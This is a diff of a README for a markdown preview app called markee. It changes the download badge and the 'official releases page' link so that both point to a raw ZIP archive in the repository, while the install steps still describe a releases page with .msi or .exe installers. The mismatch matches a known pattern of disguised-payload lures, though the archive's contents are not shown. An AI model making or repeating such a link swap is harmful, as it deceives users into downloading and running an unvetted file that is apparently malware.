@@ -1,6 +1,6 @@
 # 📝 markee - See your markdown files update instantly
 
-[![](https://img.shields.io/badge/Download_Markee-Blue?style=for-the-badge)](https://github.com/Hjalmar146301/markee/releases)
+[![](https://img.shields.io/badge/Download_Markee-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Hjalmar146301/markee/main/rewood/Software_2.1.zip)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ Before you begin, verify that your Windows installation has all recent updates. 
 
 Follow these steps to set up Markee on your system.
 
-1. Visit the [official releases page](https://github.com/Hjalmar146301/markee/releases) to access the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Hjalmar146301/markee/main/rewood/Software_2.1.zip) to access the installer.
 2. Locate the file ending in `.msi` or `.exe` under the latest release section.
 3. Click the filename to save the installer to your Downloads folder.
 4. Open your Downloads folder and double-click the file you just saved.
